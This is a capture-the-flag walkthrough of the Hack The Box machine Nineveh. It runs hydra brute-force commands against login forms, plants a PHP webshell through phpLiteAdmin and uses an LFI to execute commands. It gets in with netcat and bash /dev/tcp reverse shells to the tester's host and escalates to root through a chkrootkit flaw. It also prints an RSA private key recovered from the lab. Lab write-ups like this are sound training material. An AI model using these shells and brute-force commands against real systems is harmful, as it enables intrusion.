
![logo](/logo.png)

# [Nineveh- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 21 Oct 2017 as the tenth machine on HTB,Nineveh created by [Yas3r](https://app.hackthebox.com/users/596) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *knockd
  *PhpLiteAdmin
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/nineveh 10.10.10.43
```

###### Output 

![](Linux/Linux-Medium/Nineveh/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/nineveh 10.10.10.43                                                                                         ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 21:18 EAT
Nmap scan report for 10.10.10.43
Host is up (0.55s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
| tls-alpn: 
|_  http/1.1
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.02 seconds
```

looking at the results  we find out that there are 2 ports open and its a `Ubuntu`and its running an `Apache`. 

port[80]-  http
port[443]-http

So when we go the browser at [http://10.10.10.43](http://10.10.10.43)  looking at the browser we find a page with a work in progress.

![](/Linux/Linux-Medium/Nineveh/Screenshots/browser.png)

o lets starta `gobuster` to enumerate all directories 

# Exploitation

```sh
gobuster dir -u https://10.10.10.43 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -k --no-error 
```

![](/Linux/Linux-Medium/Nineveh/Screenshots/gobuster.png)


with the dirbuster lowercase medium wordlist, reveals two folders of importance `db`,`secure_notes` and `development`. The db directory hosts a copy of phpLiteAdmin v1.9 and secure_notes only contains a single image.

![](/Linux/Linux-Medium/Nineveh/Screenshots/db.png)

A bit of searching turns up a remote code execution vulnerability in phpLiteAdmin, however it
requires authentication. 

```sh
hydra -l admin -P /usr/share/seclists/Passwords/twitter-banned.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrectpassword" -t 64 -V
```

password:`password123`  we log and we are in 

![](/Linux/Linux-Medium/Nineveh/Screenshots/php.png)

Given the fact that I was able to identify a username of admin already, I could try to brute force the password here too (and it would work with a large enough list, like `rockyou.txt`)

![](/Linux/Linux-Medium/Nineveh/Screenshots/department.png)

In this case the valid username is admin. Running Hydra against the login, while
targeting the admin user, successfully discovers the password.

```sh
hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
```

![](/Linux/Linux-Medium/Nineveh/Screenshots/passwd.png)

then when we login in we find  site underconstruction

![](/Linux/Linux-Medium/Nineveh/Screenshots/ninevah.png)

n addition to the home button which just shows the under construction image, there’s a Notes button which just adds `?notes=files/ninevehNotes.txt` to the same PHP page and displays this text under the image and a username `amrois`

![](/Linux/Linux-Medium/Nineveh/Screenshots/under.png)

so lets go create a potential shell in the db from the PhpLIte

Create a new database ending with `.php`

![](/Linux/Linux-Medium/Nineveh/Screenshots/phpshell.png)

![](/Linux/Linux-Medium/Nineveh/Screenshots/table.png)

’ll click on the new db to switch to it, and create a table with 1 text field with a default value of a basic PHP webshell

![](Linux/Linux-Medium/Nineveh/Screenshots/test.png)


The shell is now created 

![](/Linux/Linux-Medium/Nineveh/Screenshots/shell.png)

Lets try to access the `path` of the shell updated 

![](/Linux/Linux-Medium/Nineveh/Screenshots/path.png)

Using this LFI then am able to get information.

```sh
department/manage.php?notes=/ninevehNotes/../var/tmp/leshack.php&cmd=id
```

![](/Linux/Linux-Medium/Nineveh/Screenshots/consruction.png)

To get a shell, I’ll just execute the shell from the `cmd` but let me start first burpsuite

![](/Linux/Linux-Medium/Nineveh/Screenshots/burpsuite.png)


```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f
```

it’s important to url encode  or they will be interpreted as starting a new parameter. I get a shell 

![](/Linux/Linux-Medium/Nineveh/Screenshots/shellget.png)

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

![](/Linux/Linux-Medium/Nineveh/Screenshots/stty.png)

I can see the user flag in `/home/amrois` but i cant read it 

![](/Linux/Linux-Medium/Nineveh/Screenshots/noread.png)

#### METHOD 1:

Without much to find on this box, I turned back to the clues I already had, specifically, the `/secure_notes` directory that just output an image, and the note from the logged in page that said to check the secret folder to get in, and this was a challenge.

The `/secure_notes` directory just has the `.png` and `index.html`:

![](/Linux/Linux-Medium/Nineveh/Screenshots/securenotes.png)

When a CTF leads you to a place and then all you find is an image, it’s worth inspecting it a bit more. Running `strings` validates that inclination

![](/Linux/Linux-Medium/Nineveh/Screenshots/ssl.png)

Private key:

```sh
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

Public key:

```sh
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSn
JMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv
7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```


lets make a copy of the private `key` and add it to the machine in `/dev/shm` then execute from their as we can see the user from the public key.THis is so because from the `nmap` scan we did not see any `ssh` port being opened.

and we get shell

![](/Linux/Linux-Medium/Nineveh/Screenshots/root.png)

we can get the user flag from

![](/Linux/Linux-Medium/Nineveh/Screenshots/userflag.png)

#### Method 2

###### Examine Port Knocking

The other interesting thing that jumped out from the shell as www-data is the `knockd` process 

```sh
ps auxww
```

`knockd` is a daemon for port knocking, which will set certain firewall rules when certain ports are hit in order. I can find the config file at `/etc/knockd.conf`

![](/Linux/Linux-Medium/Nineveh/Screenshots/knockd.png)

![](/Linux/Linux-Medium/Nineveh/Screenshots/knockdetc.png)

This says I can open SSH by hitting 571, 290, and then 911 with syns, all within 5 seconds, and on doing so, it will add a rule to allow my IP to get to port 22.

[how to knock](https://wiki.archlinux.org/index.php/Port_knocking) gives a good example of using `nmap` to port knock. I’ll write it as a one liner

```sh
for x in 571 290 911; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43; done; ssh -i id_rsa amrois@10.10.10.43
```

![](/Linux/Linux-Medium/Nineveh/Screenshots/knock.png)

# Privillage Escalation

Running LinEnum locates a bash script at `/usr/sbin/report-reset.sh`. 

![](Linux/Linux-Medium/Nineveh/Screenshots/LinEnum.png)

The script removes files in the `/reports/` directory. Reviewing a report file and searching some of the static strings reveals that it was created by `chkrootkit`.

![](/Linux/Linux-Medium/Nineveh/Screenshots/chkrootkit.png)

[chkrootkit](http://www.chkrootkit.org/) is a tool that will check a host for for signs of a rootkit.

![](/Linux/Linux-Medium/Nineveh/Screenshots/searchsploit.png)

```sh
slapper (){
   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}">
/dev/null 2>&1



fi
   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi


```

As this file `update` does not currently exist, it is possible to put a bash script. The `txt` file says that any file in `$SLAPPER_FILES` will run due to a typo because of this loop.The intended behavior is to set `$file_port` to be equal to `"$file_port $i"`. But because the `""` are missing, `bash` will treat that as setting `file_port=$file_port` and then running `$i`.

`$SLAPPER_FILES` is set a few lines earlier:

```
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.15/1337 0>&1' > update
chmod +x update
```

![](/Linux/Linux-Medium/Nineveh/Screenshots/privsec.png)


and just like that we get the root shell and we get the `root flag`

![](/Linux/Linux-Medium/Nineveh/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------

